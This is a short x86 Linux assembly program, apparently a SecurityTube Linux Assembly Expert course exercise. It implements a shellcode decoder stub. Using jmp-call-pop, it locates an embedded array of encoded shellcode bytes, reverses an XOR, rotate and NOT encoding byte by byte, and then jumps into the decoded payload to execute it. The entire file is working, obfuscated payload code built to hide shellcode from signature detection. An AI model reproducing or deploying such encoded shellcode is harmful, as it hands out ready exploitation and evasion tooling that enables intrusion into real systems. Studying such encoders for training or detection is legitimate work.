; Title : NOT/ROL/XOR decoder
; Author SLAE – 926 for SecurityTube Linux Assembly Expert course


global _start

section .text

_start:

	jmp short jump ; jmp call pop
	
decode:
	
	pop esi ; retrieve encoded shellcode address
	xor ecx, ecx ; ecx = 00000000
	mov cl, len ; set counter for the length of encoded shellcode

decoder:

	xor byte [esi], 0xaa
	ror byte [esi], 6
	not byte [esi]
	inc esi
	loop decoder
	
	jmp short shellcode

jump:
	call decode
	shellcode: db 0x19,0x65,0x41,0x4f,0x9e,0x9e,0x4e,0x89,0x4f,0x9e,0xcd,0x0f,0xce,0x37,0xad,0x41,0x37,0xed,0x81,0x37,0x2d,0x79,0x97,0x26,0x75
	len equ $-shellcode
